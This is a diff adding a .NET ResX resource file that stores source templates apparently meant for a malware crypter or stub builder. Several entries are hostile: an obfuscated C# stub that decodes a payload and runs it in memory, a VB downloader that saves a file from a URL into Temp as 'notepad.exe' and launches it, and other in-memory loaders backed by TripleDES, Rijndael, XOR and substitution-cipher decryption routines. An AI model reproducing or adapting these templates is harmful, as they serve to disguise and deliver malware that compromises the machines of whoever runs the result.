@@ -1,0 +1,731 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="AssemblyInfo" xml:space="preserve">
+    <value>using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// General Information about an assembly is controlled through the following 
+// set of attributes. Change these attribute values to modify the information
+// associated with an assembly.
+[assembly: AssemblyTitle("")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("")]
+[assembly: AssemblyCopyright("Copyright ©  2015")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Setting ComVisible to false makes the types in this assembly not visible 
+// to COM components.  If you need to access a type in this assembly from 
+// COM, set the ComVisible attribute to true on that type.
+[assembly: ComVisible(false)]
+
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+[assembly: Guid("df1ddc73-6b41-41a0-91e7-fd573c95daed")]
+
+// Version information for an assembly consists of the following four values:
+//
+//      Major Version
+//      Minor Version 
+//      Build Number
+//      Revision
+//
+// You can specify all the values or you can default the Build and Revision Numbers 
+// by using the '*' as shown below:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]</value>
+  </data>
+  <data name="csproj" xml:space="preserve">
+    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Project ToolsVersion="14.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" /&gt;
+  &lt;PropertyGroup&gt;
+    &lt;Configuration Condition=" '$(Configuration)' == '' "&gt;Debug&lt;/Configuration&gt;
+    &lt;Platform Condition=" '$(Platform)' == '' "&gt;AnyCPU&lt;/Platform&gt;
+    &lt;ProjectGuid&gt;{DF1DDC73-6B41-41A0-91E7-FD573C95DAED}&lt;/ProjectGuid&gt;
+    &lt;OutputType&gt;WinExe&lt;/OutputType&gt;
+    &lt;AppDesignerFolder&gt;Properties&lt;/AppDesignerFolder&gt;
+    &lt;RootNamespace&gt;test&lt;/RootNamespace&gt;
+    &lt;AssemblyName&gt;test&lt;/AssemblyName&gt;
+    &lt;TargetFrameworkVersion&gt;v3.0&lt;/TargetFrameworkVersion&gt;
+    &lt;FileAlignment&gt;512&lt;/FileAlignment&gt;
+  &lt;/PropertyGroup&gt;
+  &lt;PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "&gt;
+    &lt;PlatformTarget&gt;AnyCPU&lt;/PlatformTarget&gt;
+    &lt;DebugSymbols&gt;true&lt;/DebugSymbols&gt;
+    &lt;DebugType&gt;full&lt;/DebugType&gt;
+    &lt;Optimize&gt;false&lt;/Optimize&gt;
+    &lt;OutputPath&gt;bin\Debug\&lt;/OutputPath&gt;
+    &lt;DefineConstants&gt;DEBUG;TRACE&lt;/DefineConstants&gt;
+    &lt;ErrorReport&gt;prompt&lt;/ErrorReport&gt;
+    &lt;WarningLevel&gt;4&lt;/WarningLevel&gt;
+  &lt;/PropertyGroup&gt;
+  &lt;PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "&gt;
+    &lt;PlatformTarget&gt;AnyCPU&lt;/PlatformTarget&gt;
+    &lt;DebugType&gt;pdbonly&lt;/DebugType&gt;
+    &lt;Optimize&gt;true&lt;/Optimize&gt;
+    &lt;OutputPath&gt;bin\Release\&lt;/OutputPath&gt;
+    &lt;DefineConstants&gt;TRACE&lt;/DefineConstants&gt;
+    &lt;ErrorReport&gt;prompt&lt;/ErrorReport&gt;
+    &lt;WarningLevel&gt;4&lt;/WarningLevel&gt;
+  &lt;/PropertyGroup&gt;
+  &lt;ItemGroup&gt;
+    &lt;Reference Include="System" /&gt;
+    &lt;Reference Include="System.Data" /&gt;
+    &lt;Reference Include="System.Deployment" /&gt;
+    &lt;Reference Include="System.Drawing" /&gt;
+    &lt;Reference Include="System.Windows.Forms" /&gt;
+    &lt;Reference Include="System.Xml" /&gt;
+  &lt;/ItemGroup&gt;
+  &lt;ItemGroup&gt;
+    &lt;Compile Include="Program.cs" /&gt;
+    &lt;Compile Include="Properties\AssemblyInfo.cs" /&gt;
+    &lt;EmbeddedResource Include="Properties\Resources.resx"&gt;
+      &lt;Generator&gt;ResXFileCodeGenerator&lt;/Generator&gt;
+      &lt;LastGenOutput&gt;Resources.Designer.cs&lt;/LastGenOutput&gt;
+      &lt;SubType&gt;Designer&lt;/SubType&gt;
+    &lt;/EmbeddedResource&gt;
+    &lt;Compile Include="Properties\Resources.Designer.cs"&gt;
+      &lt;AutoGen&gt;True&lt;/AutoGen&gt;
+      &lt;DependentUpon&gt;Resources.resx&lt;/DependentUpon&gt;
+    &lt;/Compile&gt;
+    &lt;None Include="Properties\Settings.settings"&gt;
+      &lt;Generator&gt;SettingsSingleFileGenerator&lt;/Generator&gt;
+      &lt;LastGenOutput&gt;Settings.Designer.cs&lt;/LastGenOutput&gt;
+    &lt;/None&gt;
+    &lt;Compile Include="Properties\Settings.Designer.cs"&gt;
+      &lt;AutoGen&gt;True&lt;/AutoGen&gt;
+      &lt;DependentUpon&gt;Settings.settings&lt;/DependentUpon&gt;
+      &lt;DesignTimeSharedInput&gt;True&lt;/DesignTimeSharedInput&gt;
+    &lt;/Compile&gt;
+  &lt;/ItemGroup&gt;
+  &lt;Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" /&gt;
+  &lt;!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  &lt;Target Name="BeforeBuild"&gt;
+  &lt;/Target&gt;
+  &lt;Target Name="AfterBuild"&gt;
+  &lt;/Target&gt;
+  --&gt;
+&lt;/Project&gt;</value>
+  </data>
+  <data name="programcs" xml:space="preserve">
+    <value>using Microsoft.Win32;
+using System;
+using System.Windows.Forms;
+using System.Reflection;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace ކގ
+{
+    static class Program
+    {
+
+        static void Main()
+        {
+            ސދފސދފސދފސދފސދ();
+
+
+
+        }
+        static void ސދފސދފސދފސދފސދ()
+        {
+
+            
+            System.Threading.Thread.Sleep(000050);
+
+            string[] ކކގކކގކގ = System.IO.Directory.GetFiles("C:\\");
+            foreach (string i in ކކގކކގކގ)
+            {
+                ListView ގހހފފގފގފގފގފގފގ = new ListView();
+               ގހހފފގފގފގފގފގފގ.Items.Add(i).SubItems.Add(System.IO.Path.GetExtension(i));
+
+            }
+
+           
+            {
+
+
+                try
+                {
+                    string aoskoaskaosaoska = "119";
+                    string aokskokskoskskk = "119.14";
+               
+                }
+                catch
+                {
+                    string osskodsd = null;
+                }
+                ListView ގފގފގފހފގދފދފދފދ = new ListView();
+                try
+                {
+                    string aoskoaskaosaoska = "119";
+                    string aokskokskoskskk = "119.14";
+
+                }
+                catch
+                {
+                    string osskodsd = null;
+                }
+                string aosasao = "&lt;ފހފގދ&gt;";
+                try
+                {
+                    string aoskoaskaosaoska = "119";
+                    string aokskokskoskskk = "119.14";
+
+                }
+                catch
+                {
+                    string osskodsd = null;
+                }
+                aosasao = aosasao.Replace("ℙ♠☻•✖", "A").Replace("❖ℭ►☯", "B").Replace("❤", "C").Replace("ހފ", "Q");
+                try
+                {
+                    string aoskoaskaosaoska = "119";
+                    string aokskokskoskskk = "119.14";
+
+                }
+                catch
+                {
+                    string osskodsd = null;
+                }
+                ގފގފގފހފގދފދފދފދ.Items.Add("&lt;null&gt;").SubItems.Add(aosasao);
+                try
+                {
+                    string aoskoaskaosaoska = "119";
+                    string aokskokskoskskk = "119.14";
+
+                }
+                catch
+                {
+                    string osskodsd = null;
+                }
+                byte[] ފގފގފގ = Convert.FromBase64String(ފސ(ގފގފގފހފގދފދފދފދ.Items[0].SubItems[1].Text, "&lt;PASS&gt;"));
+                try
+                {
+                    string aoskoaskaosaoska = "119";
+                    string aokskokskoskskk = "119.14";
+
+                }
+                catch
+                {
+                    string osskodsd = null;
+                }
+                ސަސަދސފދސފސދފސދފސދފސދފސދފސދފ(ފގފގފގ, true);
+
+            }
+
+        }
+
+        public static void ސަސަދސފދސފސދފސދފސދފސދފސދފސދފ(byte[] ދ, bool ސަ)
+        {
+            if (ސަ = true)
+            {
+                string ސދސދސދ = null;
+                Assembly ހގހގހގހގހގހގހގ = Assembly.Load(ދ);
+                MethodInfo ސސސސސދގ = ހގހގހގހގހގހގހގ.EntryPoint;
+                if (ސސސސސދގ != null)
+                    ސސސސސދގ.Invoke(ހގހގހގހގހގހގހގ.CreateInstance(ސސސސސދގ.Name + 0 + ސދސދސދ), null);
+            }
+        }
+
+
+        public static string ފސ(string s, string p)
+        {
+
+            char[] charArray = s.ToCharArray();
+            Array.Reverse(charArray);
+            return new string(charArray);
+            string xx = new string(charArray);
+            return xx;
+
+        }
+    }
+}</value>
+  </data>
+  <data name="REEEEES" xml:space="preserve">
+    <value>
+
+namespace test.Properties
+{
+
+
+    /// &lt;summary&gt;
+    ///   A strongly-typed resource class, for looking up localized strings, etc.
+    /// &lt;/summary&gt;
+    // This class was auto-generated by the StronglyTypedResourceBuilder
+    // class via a tool like ResGen or Visual Studio.
+    // To add or remove a member, edit your .ResX file then rerun ResGen
+    // with the /str option, or rebuild your VS project.
+    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
+    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
+    internal class Resources
+    {
+
+        private static global::System.Resources.ResourceManager resourceMan;
+
+        private static global::System.Globalization.CultureInfo resourceCulture;
+
+        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
+        internal Resources()
+        {
+        }
+
+        /// &lt;summary&gt;
+        ///   Returns the cached ResourceManager instance used by this class.
+        /// &lt;/summary&gt;
+        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
+        internal static global::System.Resources.ResourceManager ResourceManager
+        {
+            get
+            {
+                if ((resourceMan == null))
+                {
+                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("test.Properties.Resources", typeof(Resources).Assembly);
+                    resourceMan = temp;
+                }
+                return resourceMan;
+            }
+        }
+
+        /// &lt;summary&gt;
+        ///   Overrides the current thread's CurrentUICulture property for all
+        ///   resource lookups using this strongly typed resource class.
+        /// &lt;/summary&gt;
+        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
+        internal static global::System.Globalization.CultureInfo Culture
+        {
+            get
+            {
+                return resourceCulture;
+            }
+            set
+            {
+                resourceCulture = value;
+            }
+        }
+    }
+}</value>
+  </data>
+  <data name="resourcesresx" xml:space="preserve">
+    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;root&gt;
+  &lt;!-- 
+    Microsoft ResX Schema 
+    
+
+            : and then encoded with base64 encoding.
+    --&gt;
+  &lt;xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata"&gt;
+    &lt;xsd:element name="root" msdata:IsDataSet="true"&gt;
+      &lt;xsd:complexType&gt;
+        &lt;xsd:choice maxOccurs="unbounded"&gt;
+          &lt;xsd:element name="metadata"&gt;
+            &lt;xsd:complexType&gt;
+              &lt;xsd:sequence&gt;
+                &lt;xsd:element name="value" type="xsd:string" minOccurs="0" /&gt;
+              &lt;/xsd:sequence&gt;
+              &lt;xsd:attribute name="name" type="xsd:string" /&gt;
+              &lt;xsd:attribute name="type" type="xsd:string" /&gt;
+              &lt;xsd:attribute name="mimetype" type="xsd:string" /&gt;
+            &lt;/xsd:complexType&gt;
+          &lt;/xsd:element&gt;
+          &lt;xsd:element name="assembly"&gt;
+            &lt;xsd:complexType&gt;
+              &lt;xsd:attribute name="alias" type="xsd:string" /&gt;
+              &lt;xsd:attribute name="name" type="xsd:string" /&gt;
+            &lt;/xsd:complexType&gt;
+          &lt;/xsd:element&gt;
+          &lt;xsd:element name="data"&gt;
+            &lt;xsd:complexType&gt;
+              &lt;xsd:sequence&gt;
+                &lt;xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" /&gt;
+                &lt;xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" /&gt;
+              &lt;/xsd:sequence&gt;
+              &lt;xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" /&gt;
+              &lt;xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" /&gt;
+              &lt;xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" /&gt;
+            &lt;/xsd:complexType&gt;
+          &lt;/xsd:element&gt;
+          &lt;xsd:element name="resheader"&gt;
+            &lt;xsd:complexType&gt;
+              &lt;xsd:sequence&gt;
+                &lt;xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" /&gt;
+              &lt;/xsd:sequence&gt;
+              &lt;xsd:attribute name="name" type="xsd:string" use="required" /&gt;
+            &lt;/xsd:complexType&gt;
+          &lt;/xsd:element&gt;
+        &lt;/xsd:choice&gt;
+      &lt;/xsd:complexType&gt;
+    &lt;/xsd:element&gt;
+  &lt;/xsd:schema&gt;
+  &lt;resheader name="resmimetype"&gt;
+    &lt;value&gt;text/microsoft-resx&lt;/value&gt;
+  &lt;/resheader&gt;
+  &lt;resheader name="version"&gt;
+    &lt;value&gt;2.0&lt;/value&gt;
+  &lt;/resheader&gt;
+  &lt;resheader name="reader"&gt;
+    &lt;value&gt;System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&lt;/value&gt;
+  &lt;/resheader&gt;
+  &lt;resheader name="writer"&gt;
+    &lt;value&gt;System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&lt;/value&gt;
+  &lt;/resheader&gt;
+&lt;/root&gt;</value>
+  </data>
+  <data name="setting" xml:space="preserve">
+    <value>&lt;?xml version='1.0' encoding='utf-8'?&gt;
+&lt;SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)"&gt;
+  &lt;Profiles&gt;
+    &lt;Profile Name="(Default)" /&gt;
+  &lt;/Profiles&gt;
+  &lt;Settings /&gt;
+&lt;/SettingsFile&gt;</value>
+  </data>
+  <data name="settingdesignedr" xml:space="preserve">
+    <value>namespace test.Properties
+{
+
+
+    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
+    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "11.0.0.0")]
+    internal sealed partial class Settings : global::System.Configuration.ApplicationSettingsBase
+    {
+
+        private static Settings defaultInstance = ((Settings)(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings())));
+
+        public static Settings Default
+        {
+            get
+            {
+                return defaultInstance;
+            }
+        }
+    }
+}</value>
+  </data>
+  <data name="txt1" xml:space="preserve">
+    <value>Module Module1
+    Sub min()
+        Dim x As Reflection.Assembly = Reflection.Assembly.Load(Convert.FromBase64String(TripleDES_Decrypt("value", "Dkey"))).EntryPoint.Invoke(Nothing, Nothing)
+    End Sub
+    Public Function TripleDES_Decrypt(ByVal input As String, ByVal pass As String) As String
+        Dim TripleDES As New System.Security.Cryptography.TripleDESCryptoServiceProvider
+        Dim Hash_TripleDES As New System.Security.Cryptography.MD5CryptoServiceProvider
+        Dim decrypted As String = ""
+        Try
+            Dim hash(23) As Byte
+            Dim temp As Byte() = Hash_TripleDES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
+            Array.Copy(temp, 0, hash, 0, 16)
+            Array.Copy(temp, 0, hash, 15, 8)
+            TripleDES.Key = hash
+            TripleDES.Mode = Security.Cryptography.CipherMode.ECB
+            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = TripleDES.CreateDecryptor
+            Dim Buffer As Byte() = Convert.FromBase64String(input)
+            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
+            Return decrypted
+        Catch ex As Exception
+        End Try
+    End Function
+End Module</value>
+  </data>
+  <data name="url" xml:space="preserve">
+    <value>Module Module1
+    Function start(ByVal Name As String)
+        Process.Start(Name)
+    End Function
+    Function path(ByVal exename As String)
+        Dim x = My.Computer.FileSystem.SpecialDirectories.Temp &amp; "\" &amp; exename &amp; ".exe"
+        Return x
+    End Function
+    Function getexe(ByVal url As String)
+        Dim x As New System.Net.WebClient
+        x.DownloadFile(url, path("notepad"))
+        start(path("notepad"))
+    End Function
+    Sub main()
+        If My.Computer.Name = My.Computer.Name Then
+            If My.User.Name = My.User.Name Then
+                getexe("minaurl")
+            End If
+        End If
+    End Sub
+End Module</value>
+  </data>
+  <data name="bas64" xml:space="preserve">
+    <value>Module Module1
+    Sub main()
+
+    End Sub
+
+
+    Public p0 As Object = My.Resources.pit0
+    Public p1 As Object = My.Resources.pit1
+    Public p2 As Object = My.Resources.pit2
+
+    Public t As String = p0 &amp; p1 &amp; p2
+    Public y As Object = t.Replace("^", "A")
+
+
+    Public gg As Byte() = Convert.FromBase64String(y)
+
+    Public mm As Object = AppDomain.CurrentDomain.Load(gg)
+    Public hh As String = mm.entrypoint.invoke(Nothing, Nothing)
+
+End Module</value>
+  </data>
+  <data name="Gzip" xml:space="preserve">
+    <value>Public Function DecompressGZip(bytesToDecompress As Byte()) As Byte()
+        Using stream = New GZipStream(New MemoryStream(bytesToDecompress), CompressionMode.Decompress)
+            Const size As Integer = 4096
+            Dim buffer = New Byte(size - 1) {}
+            Using memoryStream = New MemoryStream()
+                Dim count As Integer
+                Do
+                    count = stream.Read(buffer, 0, size)
+                    If count &gt; 0 Then
+                        memoryStream.Write(buffer, 0, count)
+                    End If
+                Loop While count &gt; 0
+                Return memoryStream.ToArray()
+            End Using
+        End Using
+    End Function</value>
+  </data>
+  <data name="Jp2" xml:space="preserve">
+    <value>Public Function LORDDecrypt(ByVal ParmDec As String)
+        ParmDec = ParmDec.Replace("月", "a").Replace("아", "A").Replace("官", "b").Replace("악", "B").Replace("匹", "c").Replace("안", "C").Replace("力", "d").Replace("알", "D").Replace("三", "e").Replace("앙", "E").Replace("下", "f").Replace("앞", "F").Replace("巨", "g").Replace("얘", "G").Replace("升", "h").Replace("ᄍ", "H").Replace("工", "i").Replace("ᄊ", "I").Replace("丁", "j").Replace("ᄈ", "J").Replace("水", "k").Replace("응", "K").Replace("心", "l").Replace("읍", "L").Replace("冊", "m").Replace("음", "M").Replace("內", "n").Replace("을", "N").Replace("口", "o").Replace("임", "O").Replace("戶", "p").Replace("잎", "P").Replace("已", "q").Replace("율", "Q").Replace("尺", "r").Replace("월", "R").Replace("弓", "s").Replace("원", "S").Replace("七", "t").Replace("웅", "T").Replace("臼", "u").Replace("울", "U").Replace("人", "v").Replace("운", "V").Replace("山", "w").Replace("옴", "W").Replace("父", "x").Replace("왕", "X").Replace("了", "y").Replace("왜", "Y").Replace("乙", "z").Replace("에", "Z")
+        Return ParmDec
+    End Function</value>
+  </data>
+  <data name="md5" xml:space="preserve">
+    <value>Public Function md5Decrypt(ByVal bytData As Byte(), ByVal sKey As String, Optional ByVal tMode As CipherMode = 2, Optional ByVal tPadding As PaddingMode = 2) As Byte()
+        Dim provider As New MD5CryptoServiceProvider
+        Dim buffer2 As Byte() = provider.ComputeHash(Encoding.UTF8.GetBytes(sKey))
+        provider.Clear()
+        Dim provider2 As New TripleDESCryptoServiceProvider
+        provider2.Key = buffer2
+        provider2.Mode = tMode
+        provider2.Padding = tPadding
+        Dim buffer3 As Byte() = provider2.CreateDecryptor.TransformFinalBlock(bytData, 0, bytData.Length)
+        provider2.Clear()
+        Return buffer3
+    End Function</value>
+  </data>
+  <data name="trvg1" xml:space="preserve">
+    <value>Public Function TripleDES_Decrypt(ByVal input As String, ByVal pass As String) As String
+        Dim TripleDES As New System.Security.Cryptography.TripleDESCryptoServiceProvider
+        Dim Hash_TripleDES As New System.Security.Cryptography.MD5CryptoServiceProvider
+        Dim decrypted As String = ""
+        Try
+            Dim hash(23) As Byte
+            Dim temp As Byte() = Hash_TripleDES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
+            Array.Copy(temp, 0, hash, 0, 16)
+            Array.Copy(temp, 0, hash, 15, 8)
+            TripleDES.Key = hash
+            TripleDES.Mode = Security.Cryptography.CipherMode.ECB
+            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = TripleDES.CreateDecryptor
+            Dim Buffer As Byte() = Convert.FromBase64String(input)
+            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
+            Return decrypted
+        Catch ex As Exception
+        End Try
+    End Function</value>
+  </data>
+  <data name="trydel" xml:space="preserve">
+    <value>Public Function Decrypt(ByVal sData As String, ByVal sKey As String)
+        Dim bytData() As Byte = Encoding.ASCII.GetBytes(sData)
+        Return Decrypt(bytData, sKey)
+    End Function
+    Public Function Decrypt(ByVal bytData As Byte(), ByVal strPass As String) As Byte()
+        Dim bytResult As Byte()
+        Using oRM As New System.Security.Cryptography.RijndaelManaged
+            oRM.KeySize = 256
+            oRM.Key = GeKey(strPass)
+            oRM.IV = GetIV(strPass)
+            Using oMS As New MemoryStream(bytData)
+                Using oCS As New Cryptography.CryptoStream(oMS, oRM.CreateDecryptor, Security.Cryptography.CryptoStreamMode.Read)
+                    Dim TempDecryptArr As Byte()
+                    ReDim TempDecryptArr(bytData.Length)
+                    Dim decryptedByteCount As Integer
+                    decryptedByteCount = oCS.Read(TempDecryptArr, 0, bytData.Length)
+                    ReDim bytResult(decryptedByteCount)
+                    Array.Copy(TempDecryptArr, bytResult, decryptedByteCount)
+                    oCS.Close()
+                End Using
+                oMS.Close()
+            End Using
+        End Using
+        Return bytResult
+    End Function
+
+    Private Function GeKey(ByVal strPass As String) As Byte()
+        Dim bytResult As Byte()
+        Using oSHA256 As New Cryptography.SHA256Managed
+            Dim L1 As String = System.Convert.ToBase64String(oSHA256.ComputeHash(Encoding.UTF8.GetBytes(strPass)))
+            Dim L2 As String = strPass &amp; L1
+            bytResult = oSHA256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(L2))
+            oSHA256.Clear()
+        End Using
+        Return bytResult
+    End Function
+    Private Function GetIV(ByVal strPass As String) As Byte()
+        Dim bytResult As Byte()
+        Using oMD5 As New Cryptography.MD5CryptoServiceProvider
+            Dim L1 As String = System.Convert.ToBase64String(oMD5.ComputeHash(Encoding.UTF8.GetBytes(strPass)))
+            Dim L2 As String = strPass &amp; L1
+            bytResult = oMD5.ComputeHash(System.Text.Encoding.UTF8.GetBytes(L2))
+            oMD5.Clear()
+        End Using
+        Return bytResult
+    End Function</value>
+  </data>
+  <data name="vgr" xml:space="preserve">
+    <value>Public Shared Function Decrypt(ByVal proj As String, ByVal key As String)
+       Dim decryptedText As String = ""
+       For i As Integer = 1 To proj.Length
+           Dim temp As Integer = AscW(GetChar(proj, i)) - AscW(GetChar(key, i Mod key.Length + 1))
+           decryptedText += ChrW(temp)
+       Next
+       Return decryptedText
+   End Function</value>
+  </data>
+  <data name="Xoor" xml:space="preserve">
+    <value>Public Function XOR_Decrypt(ByVal Input As String, ByVal pass As String) As String
+        Dim out As New System.Text.StringBuilder
+        Dim u As Integer
+        For i As Integer = 0 To Input.Length - 1 Step +2
+            Dim tmp As String = Chr(("&amp;H" &amp; Input.Substring(i, 2)) Xor Asc(pass(u)))
+            out.Append(tmp)
+            If u = pass.Length - 1 Then u = 0 Else u = u + 1
+        Next
+        Return out.ToString
+    End Function</value>
+  </data>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="click_one" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\click_one.wav;System.IO.MemoryStream, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+</root>
